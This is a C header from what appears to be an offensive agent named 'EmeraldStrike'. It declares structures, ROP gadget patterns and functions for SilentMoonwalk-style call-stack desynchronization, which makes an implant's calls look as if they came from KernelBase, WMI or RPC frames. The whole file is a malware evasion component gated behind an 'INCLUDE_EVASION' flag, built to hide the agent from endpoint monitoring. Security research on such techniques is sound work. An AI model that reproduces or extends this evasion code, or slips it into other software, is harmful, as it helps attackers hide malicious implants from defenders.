/*
    EmeraldStrike - Desync/SilentMoonwalk Callstack Spoofing
    Based on SilentMoonwalk by KlezVirus / Waldo-IRC / Trickster0

    ROP-based stack desynchronization: builds fake frames from legitimate
    .pdata entries, routes calls through gadget chains so the unwound
    callstack shows KernelBase / WMI / RPC frames instead of the agent.

    All state stored in INSTANCE struct - no .data globals.
    x64 only. Gated by INCLUDE_EVASION_CALLSTACK_SPOOF.
*/

#ifndef EMERALDSTRIKE_CALLSTACK_SPOOF_H
#define EMERALDSTRIKE_CALLSTACK_SPOOF_H

#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
#ifdef _WIN64

#include <windows.h>

// ============================================================================
// Unwind info structures (not in MinGW headers)
// ============================================================================

typedef unsigned char UBYTE;

typedef union _DS_UNWIND_CODE {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} DS_UNWIND_CODE, *PDS_UNWIND_CODE;

typedef struct _DS_UNWIND_INFO {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    DS_UNWIND_CODE UnwindCode[1];
} DS_UNWIND_INFO, *PDS_UNWIND_INFO;

// Register indices for OpInfo
#define DS_REG_RAX  0
#define DS_REG_RCX  1
#define DS_REG_RDX  2
#define DS_REG_RBX  3
#define DS_REG_RSP  4
#define DS_REG_RBP  5
#define DS_REG_RSI  6
#define DS_REG_RDI  7

// Unwind opcodes
#define DS_UWOP_PUSH_NONVOL      0
#define DS_UWOP_ALLOC_LARGE      1
#define DS_UWOP_ALLOC_SMALL      2
#define DS_UWOP_SET_FPREG        3
#define DS_UWOP_SAVE_NONVOL      4
#define DS_UWOP_SAVE_NONVOL_BIG  5
#define DS_UWOP_EPILOG           6
#define DS_UWOP_SPARE_CODE       7
#define DS_UWOP_SAVE_XMM128      8
#define DS_UWOP_SAVE_XMM128BIG   9
#define DS_UWOP_PUSH_MACH_FRAME  10

// Flags
#define DS_UNW_FLAG_CHAININFO  0x04

// Gadget byte patterns
#define DS_JMP_RBX       0x23FF   // ff 23 = jmp [rbx]
#define DS_RET_BYTE      0xC3

// Minimum ADD RSP immediate
#define DS_MIN_ADD_RSP_IMM   0x28
#define DS_PREFERRED_ADD_RSP_IMM  0x58

// ============================================================================
// Spoof mode constants (must match config.h)
// ============================================================================
#define SPOOF_NONE    0
#define SPOOF_WMI     1
#define SPOOF_RPC     2
#define SPOOF_CUSTOM  3

// ============================================================================
// DESYNC_SPOOFER struct - must match layout in desync_spoof.x64.asm
// All fields are 8 bytes (QWORD) for alignment
// ============================================================================

typedef struct _DESYNC_SPOOFER {
    /* Module pointers */
    PVOID   KernelBaseAddress;              // +0x00
    PVOID   KernelBaseAddressEnd;           // +0x08

    /* Synthetic frame pointers (unused in desync mode, kept for struct layout) */
    PVOID   RtlUserThreadStartAddress;      // +0x10
    PVOID   BaseThreadInitThunkAddress;     // +0x18

    /* Frame pointers found during discovery */
    PVOID   FirstFrameFunctionPointer;      // +0x20
    PVOID   SecondFrameFunctionPointer;     // +0x28
    PVOID   JmpRbxGadget;                   // +0x30
    PVOID   AddRspXGadget;                  // +0x38

    /* Frame sizes */
    UINT64  FirstFrameSize;                 // +0x40
    UINT64  FirstFrameRandomOffset;         // +0x48
    UINT64  SecondFrameSize;                // +0x50
    UINT64  SecondFrameRandomOffset;        // +0x58
    UINT64  JmpRbxGadgetFrameSize;          // +0x60
    UINT64  AddRspXGadgetFrameSize;         // +0x68

    /* Synthetic frame size */
    UINT64  RtlUserThreadStartFrameSize;    // +0x70
    UINT64  AddRspImmediate;                // +0x78

    /* Offset where RBP is pushed in second frame */
    UINT64  StackOffsetWhereRbpIsPushed;    // +0x80

    /* Runtime fields */
    PVOID   JmpRbxGadgetRef;                // +0x88
    PVOID   SpoofFunctionPointer;           // +0x90
    PVOID   ReturnAddress;                  // +0x98

    /* Number of arguments + argument values */
    UINT64  Nargs;                          // +0xA0
    PVOID   Arg01;                          // +0xA8
    PVOID   Arg02;                          // +0xB0
    PVOID   Arg03;                          // +0xB8
    PVOID   Arg04;                          // +0xC0
    PVOID   Arg05;                          // +0xC8
    PVOID   Arg06;                          // +0xD0
    PVOID   Arg07;                          // +0xD8
    PVOID   Arg08;                          // +0xE0
    PVOID   Arg09;                          // +0xE8
    PVOID   Arg10;                          // +0xF0
    PVOID   Arg11;                          // +0xF8
} DESYNC_SPOOFER, *PDESYNC_SPOOFER;

// ============================================================================
// API
// ============================================================================

struct _INSTANCE;

// Initialize the callstack spoofer. Scans KernelBase .pdata for frames and
// gadgets, optionally overlaying frame sources from WMI/RPC/custom modules.
BOOL callstack_spoof_init(struct _INSTANCE* inst);

// Refresh random frame offsets for return address variation
void callstack_spoof_refresh(PDESYNC_SPOOFER pSpoofer, UINT32* pRngState);

// ASM: perform a spoofed call with desynchronized stack
extern "C" PVOID desync_spoof_call(PDESYNC_SPOOFER pConfig);

// Compute max safe arg count for a found ADD RSP gadget immediate
static __inline UINT32 spoof_max_args(UINT64 addRspImm) {
    if (addRspImm < 0x20) return 4;
    return (UINT32)(3 + (addRspImm - 0x18) / 8);
}

// Spoofed dispatch: packs args into the DESYNC_SPOOFER and calls desync_spoof_call
PVOID callstack_spoofed_call(struct _INSTANCE* inst, PVOID pTarget, DWORD nArgs, ...);

#endif // _WIN64
#endif // INCLUDE_EVASION_CALLSTACK_SPOOF
#endif // EMERALDSTRIKE_CALLSTACK_SPOOF_H
